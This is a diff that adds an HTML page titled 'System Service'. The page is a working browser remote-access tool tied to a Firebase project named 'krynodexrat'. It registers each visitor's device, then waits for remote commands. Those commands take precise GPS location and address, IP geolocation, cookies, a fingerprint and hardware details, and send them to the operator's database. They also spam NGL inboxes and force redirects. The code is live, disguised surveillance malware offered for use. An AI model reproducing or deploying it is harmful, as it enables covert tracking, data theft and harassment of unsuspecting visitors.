@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Service</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Courier New',monospace;flex-direction:column;gap:10px;text-align:center;padding:20px;user-select:none}
+.status-text{font-size:11px;color:#0f0;letter-spacing:1px}
+.id-text{font-size:7px;color:#222;margin-top:6px}
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;animation:fadeIn .25s}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.alert-box{background:#0a0a0a;border:1px solid #ff3333;border-radius:16px;padding:36px 28px;text-align:center;max-width:88vw;box-shadow:0 0 80px rgba(255,0,0,.15)}
+.alert-msg{color:#ff4444;font-size:16px;font-weight:600;font-family:'Segoe UI',system-ui,sans-serif;word-break:break-word;line-height:1.5}
+.alert-close{background:transparent;color:#ff6666;border:1px solid #ff3333;padding:10px 28px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;margin-top:14px;transition:.2s;font-family:'Segoe UI',system-ui,sans-serif;letter-spacing:.5px}
+.alert-close:hover{background:#ff3333;color:#000}
+</style>
+</head>
+<body>
+<div class="status-text" id="statusMsg">● INITIALIZING</div>
+<div class="id-text" id="idDisplay"></div>
+
+<script>
+const STORAGE_KEY='__az_id';
+let DEVICE_ID=localStorage.getItem(STORAGE_KEY);
+if(!DEVICE_ID){DEVICE_ID='DVC_'+Math.random().toString(36).substr(2,9)+'_'+Date.now().toString(36);localStorage.setItem(STORAGE_KEY,DEVICE_ID)}
+document.getElementById('idDisplay').textContent=DEVICE_ID;
+
+const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(FB);
+const db=firebase.database();
+
+function ts(){return Date.now()}
+async function fetchJSON(url,opts={}){try{const r=await fetch(url,{...opts});return await r.json()}catch(e){return{err:"Request failed"}}}
+
+db.ref('devices/'+DEVICE_ID).update({id:DEVICE_ID,model:(navigator.userAgent.split(';')[1]||'Browser').trim().substring(0,50),platform:navigator.platform,lang:navigator.language,scr:screen.width+'x'+screen.height,reg:ts(),seen:ts(),on:true}).then(()=>document.getElementById('statusMsg').textContent='● ACTIVE').catch(()=>document.getElementById('statusMsg').textContent='● ERROR');
+setInterval(()=>db.ref('devices/'+DEVICE_ID).update({seen:ts(),on:true}),12000);
+
+// ═══════════════ 1-8: DEVICE INTELLIGENCE ═══════════════
+async function gpsFull(){return new Promise(r=>{if(!navigator.geolocation){r({err:"GPS not available"});return}navigator.geolocation.getCurrentPosition(async p=>{const lat=p.coords.latitude,lon=p.coords.longitude;try{const re=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);const d=await re.json();r({lat,lon,acc:Math.round(p.coords.accuracy)+'m',addr:d.display_name,city:d.address?.city||d.address?.town||'',state:d.address?.state||'',country:d.address?.country||'',map:`https://maps.google.com/?q=${lat},${lon}`})}catch(e){r({lat,lon,acc:Math.round(p.coords.accuracy)+'m',map:`https://maps.google.com/?q=${lat},${lon}`})}},e=>r({err:e.message}),{enableHighAccuracy:true,timeout:10000})})}
+async function ipGeo(){return await fetchJSON('https://ipapi.co/json/')}
+async function devInfo(){let bat='N/A';try{const b=await navigator.getBattery();bat=Math.round(b.level*100)+'% '+(b.charging?'Charging':'Battery')}catch(e){}let ip='N/A';try{ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch(e){}return{ua:navigator.userAgent.substring(0,150),os:navigator.platform,lang:navigator.language,res:screen.width+'x'+screen.height+' @'+devicePixelRatio+'x',ram:navigator.deviceMemory||'?',cpu:navigator.hardwareConcurrency||'?',bat,ip,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,on:navigator.onLine,ck:navigator.cookieEnabled}}
+function getCookies(){const cks=document.cookie.split(';').map(c=>c.trim()).filter(c=>c);return{count:cks.length,cookies:cks.join(' | ')||'No cookies',domain:location.hostname}}
+function browserFingerprint(){const fp={ua:navigator.userAgent,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,scr:screen.width+'x'+screen.height+'x'+screen.colorDepth,dpr:devicePixelRatio,mem:navigator.deviceMemory,cpu:navigator.hardwareConcurrency,plat:navigator.platform,vendor:navigator.vendor,cookies:navigator.cookieEnabled,touch:navigator.maxTouchPoints,plugins:Array.from(navigator.plugins||[]).map(p=>p.name).join(',')};fp.hash=btoa(JSON.stringify(fp)).substring(0,32);return fp}
+function screenDetail(){return{outer:window.outerWidth+'x'+window.outerHeight,inner:window.innerWidth+'x'+window.innerHeight,avail:screen.availWidth+'x'+screen.availHeight,colorDepth:screen.colorDepth,pixelDepth:screen.pixelDepth,orientation:screen.orientation?.type||'N/A',angle:screen.orientation?.angle||0}}
+function hwInfo(){let gpu='N/A';try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg)gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}catch(e){}return{ram:navigator.deviceMemory||'?',cpu:navigator.hardwareConcurrency||'?',gpu,touch:'ontouchstart' in window,maxTouch:navigator.maxTouchPoints||0,orientation:screen.orientation?.type||'N/A'}}
+function perfTiming(){const t=performance.timing||{};return{loadTime:((t.loadEventEnd-t.navigationStart)||'?')+'ms',domReady:((t.domContentLoadedEventEnd-t.navigationStart)||'?')+'ms',ttfb:((t.responseStart-t.requestStart)||'?')+'ms',dns:((t.domainLookupEnd-t.domainLookupStart)||'?')+'ms'}}
+
+// ═══════════════ 9-25: GEN Z / OSINT / FUN ═══════════════
+async function pinterestSearch(q){return await fetchJSON(`https://api.nexray.web.id/search/pinterest?q=${encodeURIComponent(q)}`)}
+async function spotifySearch(q){return await fetchJSON(`https://api.nexray.web.id/search/spotify?q=${encodeURIComponent(q)}`)}
+async function nglSpam(url,pesan,jumlah){return await fetchJSON(`https://api.nexray.web.id/ngl-spam?url=${encodeURIComponent(url)}&pesan=${encodeURIComponent(pesan)}&jumlah=${jumlah||10}`)}
+async function tiktokStalk(user){return await fetchJSON(`https://api.tiktok.com/oembed?url=https://www.tiktok.com/@${user}`).catch(()=>({err:"User not found or private"}))}
+async function instagramInfo(user){return await fetchJSON(`https://www.instagram.com/${user}/?__a=1`).catch(()=>({err:"IG API blocked"}))}
+async function weather(lat,lon){return await fetchJSON(`https://api.open-meteo.com/v1/forecast?latitude=${lat||-6.2}&longitude=${lon||106.8}&current_weather=true`)}
+async function cryptoPrice(coin){return await fetchJSON(`https://api.coingecko.com/api/v3/simple/price?ids=${coin||'bitcoin'}&vs_currencies=usd,idr,eur`)}
+async function currencyConvert(from,to){return await fetchJSON(`https://api.exchangerate-api.com/v4/latest/${from||'USD'}`).then(d=>({rate:d.rates?.[to||'IDR']||'N/A',from:from||'USD',to:to||'IDR'}))}
+async function urbanDict(term){return await fetchJSON(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(term)}`).then(d=>({term,definition:d.list?.[0]?.definition?.substring(0,500)||'Not found',example:d.list?.[0]?.example||'',url:d.list?.[0]?.permalink||''}))}
+async function randomMeme(){return await fetchJSON('https://meme-api.com/gimme').then(d=>({title:d.title,url:d.url,author:d.author,subreddit:d.subreddit}))}
+async function randomQuote(){return await fetchJSON('https://api.quotable.io/random').then(d=>({quote:d.content,author:d.author,tags:d.tags?.join(', ')}))}
+async function randomFact(){return await fetchJSON('https://uselessfacts.jsph.pl/api/v2/facts/random').then(d=>({fact:d.text,source:d.source}))}
+async function randomJoke(){return await fetchJSON('https://official-joke-api.appspot.com/random_joke').then(d=>({setup:d.setup,punchline:d.punchline}))}
+async function dnsLookup(domain){return await fetchJSON(`https://dns.google/resolve?name=${domain||location.hostname}&type=A`)}
+async function whoisLookup(domain){return await fetchJSON(`https://api.domainsdb.info/v1/domains/search?domain=${domain}`).catch(()=>({err:"WHOIS failed"}))}
+async function emailBreach(email){return await fetchJSON(`https://haveibeenpwned.com/api/v3/breachedaccount/${email}`).catch(()=>({err:"API limited or not found"}))}
+async function phoneLookup(phone){return await fetchJSON(`https://api.numlookupapi.com/v1/validate/${phone}`).catch(()=>({err:"API key required"}))}
+function alertFull(msg){const ov=document.createElement('div');ov.className='alert-overlay';ov.innerHTML=`<div class="alert-box"><p class="alert-msg">${msg}</p><button class="alert-close" onclick="this.closest('.alert-overlay').remove()">CLOSE</button></div>`;document.body.appendChild(ov);return{status:'alerted',msg}}
+
+// ═══════════════ EXECUTE ═══════════════
+async function exec(cmd){
+  const r={type:cmd,status:'ok',time:ts()};
+  const parts=cmd.split(':');
+  const action=parts[0];
+  const arg=parts.slice(1).join(':');
+  
+  switch(action){
+    case 'GPS':r.data=await gpsFull();break;
+    case 'IP':r.data=await ipGeo();break;
+    case 'INFO':r.data=await devInfo();break;
+    case 'FINGERPRINT':r.data=browserFingerprint();break;
+    case 'SCREEN':r.data=screenDetail();break;
+    case 'HW':r.data=hwInfo();break;
+    case 'COOKIES':r.data=getCookies();break;
+    case 'PERF':r.data=perfTiming();break;
+    case 'PINTEREST':r.data=await pinterestSearch(arg);break;
+    case 'SPOTIFY':r.data=await spotifySearch(arg);break;
+    case 'NGL':const[nglUrl,nglMsg,nglAmt]=arg.split('|');r.data=await nglSpam(nglUrl,nglMsg,nglAmt);break;
+    case 'TIKTOK':r.data=await tiktokStalk(arg);break;
+    case 'IG':r.data=await instagramInfo(arg);break;
+    case 'WEATHER':const[lat,lon]=arg.split(',');r.data=await weather(lat,lon);break;
+    case 'CRYPTO':r.data=await cryptoPrice(arg);break;
+    case 'CURRENCY':const[from,to]=arg.split('|');r.data=await currencyConvert(from,to);break;
+    case 'URBAN':r.data=await urbanDict(arg);break;
+    case 'MEME':r.data=await randomMeme();break;
+    case 'QUOTE':r.data=await randomQuote();break;
+    case 'FACT':r.data=await randomFact();break;
+    case 'JOKE':r.data=await randomJoke();break;
+    case 'DNS':r.data=await dnsLookup(arg);break;
+    case 'WHOIS':r.data=await whoisLookup(arg);break;
+    case 'BREACH':r.data=await emailBreach(arg);break;
+    case 'PHONE':r.data=await phoneLookup(arg);break;
+    case 'MSG':r.data=alertFull(arg);r.type='ALERT';break;
+    case 'URL':open(arg,'_blank');r.data={url:arg};r.type='OPEN_URL';break;
+    case 'REDIR':try{location.href=arg;r.data={redirecting:arg}}catch(e){r.data={err:e.message}}r.type='REDIRECT';break;
+    default:r.data={err:'unknown command'};
+  }
+  return r;
+}
+
+db.ref('cmds/'+DEVICE_ID).on('child_added',async sn=>{
+  const c=sn.val();if(!c||c.st!=='pending')return;
+  sn.ref.update({st:'running'});
+  const result=await exec(c.cmd);
+  db.ref('data').push(result);
+  sn.ref.update({st:'done'});
+  setTimeout(()=>sn.ref.remove(),3000);
+});
+</script>
+</body>
+</html>
